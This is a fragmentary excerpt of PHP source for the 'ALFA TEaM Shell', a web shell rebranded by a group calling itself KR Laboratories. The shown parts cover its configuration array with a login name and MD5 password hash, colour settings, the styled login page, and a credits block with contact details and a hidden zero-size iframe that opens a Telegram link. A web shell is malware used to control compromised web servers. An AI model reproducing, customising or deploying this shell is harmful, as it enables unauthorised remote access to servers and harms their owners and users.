...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'krlabs',
    'password' => '8e70383c69f7a3b7ea3f71b02f3e9731',//md5(mynewpassword)
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"main_size" => "#46A9F3",
		"main_modify" => "#46A9F3",
		"main_owner_group" => "#46A9F3",
		"main_green_perm" => "#61ce70",
...
echo '
  <style>body{background:black;color:#61ce70;font-family:'Verdana','Arial',sans-serif;}#loginbox{font-size:11px;color:#61ce70;right:85px;width:1200px;height:200px;border-radius:5px;position:fixed;top:250px;background-color:black;}#loginbox td{border-radius:5px;font-size:11px;}input[type="text"],input[type="password"]{border:1px solid #065FD4;border-radius:5px;background-color:#000;color:#61ce70;padding:5px;width:250px;}input[type="text"]:focus,input[type="password"]:focus{box-shadow:0 0 4px #46A9F3;border:1px solid #46A9F3;}input[type="submit"]{background-color:#065FD4;color:#FFF;border:1px solid #46A9F3;border-radius:5px;padding:5px 10px;cursor:pointer;}input[type="submit"]:hover{background-color:#46A9F3;box-shadow:0 0 4px #46A9F3;border:1px solid #065FD4;}</style>
<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center><center><img style="border-radius:100px;" width="500" height="250" alt="KR Laboratories" draggable="false" src="https://kr-labs.com.ua/wp-content/uploads/2021/03/krlaboratories-it-ua.png" /></center><div id="loginbox"><p><font face="verdana,arial" size=-1><center><table cellpadding='2' cellspacing='0' border='0' id='ap_table'><tr><td bgcolor="#065FD4"><table cellpadding='0' cellspacing='0' border='0' width='100%'><tr><td bgcolor="#065FD4" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr><tr><td bgcolor="black" style="padding:5"><form method="post"><input type="hidden" name="action" value="login"><input type="hidden" name="hide" value=""><center><table><tr><td><font color="#61ce70" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" name="usrname" placeholder="username"></td></tr><tr><td><font color="#61ce70" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" name="password" placeholder="password"></td></tr><tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Login"></font></td></tr></table></div><br /></center>';
exit;
}
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://kr-labs.com.ua/wp-content/uploads/2021/03/krlaboratories-it-ua.png'><br>
<b><font size='+3' color='#61ce70'>&#9774; ~ INNOVATION ~ &#9774;</font><br><b>
<font color='#61ce70'>Shell Coded By KR Laboratories</font><br>
<font color='#61ce70'>Contact : info@kr-labs.com.ua</font><br>
<font color='#61ce70'>Website: <a href='https://kr-labs.com.ua' style='color: #61ce70;'>kr-labs.com.ua</a></font><br>
<font color='#FFFFFF'>Skype : kr-labs</font><br>
<font color='#FFFFFF'>Phone: +380123456789</font><br>
<font color='#FF0000'>Technology for a Better Tomorrow</font><br>
<font color='#FF0000'>Ukrainian Programmers</font><br>
<font color='#FF0000'>############</font><br>
</center></pre><iframe src='tg://resolve?domain=krlabs' frameborder='0' width='0' height='0'></iframe>";
}
echo __pre().$about_us;
echo('</div>');
alfafooter();
